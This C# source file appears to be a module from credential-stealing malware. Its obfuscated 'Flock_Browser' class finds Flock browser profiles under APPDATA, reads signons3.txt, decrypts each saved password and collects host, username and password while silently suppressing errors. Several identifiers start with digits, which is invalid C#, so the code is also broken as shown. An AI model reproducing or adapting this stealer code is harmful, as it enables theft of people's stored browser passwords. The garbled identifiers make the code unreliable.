using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using C6Zy;
using Cc5oGNTD;
using JSW1fecBOy;
using reJu9lk2r;

namespace rk937aHHc
{
	public class Flock_Browser : EtbH
	{
		public Flock_Browser()
		{
			this.RvVco4 = "Flock Browser";
		}
		public string RvVco4 { get; set; }

    public List<WTitxI2m> Grab()
    {
        List<WTitxI2m> list = new List<WTitxI2m>();

        try
        {
            string appData = Environment.GetEnvironmentVariable("APPDATA");
            string flockPath = appData + "\\Flock\\Browser\\";
            string[] profiles = COF.wS9grBYZnl(flockPath);

            foreach (string profilePath in profiles)
            {
                string signonsPath = Path.Combine(profilePath, "signons3.txt");
                if (!File.Exists(signonsPath))
                    continue;

                string signonsText = File.ReadAllText(signonsPath);

                int entryCount = Regex.Matches(signonsText, Regex.Escape("---")).Count;

                byte[] key = COF.1N7un(profilePath);
                if (key == null)
                    continue;

                for (int i = 0; i < entryCount; i++)
                {
                    string entry = g3Vt7T2gk5.1b9(
                        signonsText,
                        Environment.NewLine + "." + Environment.NewLine,
                        "---",
                        i
                    );

                    string[] lines = entry.Split(
                        new string[] { Environment.NewLine },
                        StringSplitOptions.None
                    );

                    string host = lines[0];
                    string username = lines[1];

                    var asn = new 1ojM8OAmgFO();
                    q3iR parsed = asn.Xuk(Convert.FromBase64String(lines[4]));

                    byte[] iv = parsed.35ejV[0].35ejV[1].35ejV[1].UfibxSIi;
                    byte[] cipherText = parsed.35ejV[0].35ejV[2].UfibxSIi;

                    string password = qS6WnrZN4l.ndFD4zyM(cipherText, key, iv);

                    if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                    {
                        list.Add(new WTitxI2m
                        {
                            data1 = host,
                            data2 = username,
                            data3 = password,
                            data4 = this.RvVco4
                        });
                    }
                }
            }
        }
        catch
        {
            return new List<WTitxI2m>();
        }

        return list;
    }
}

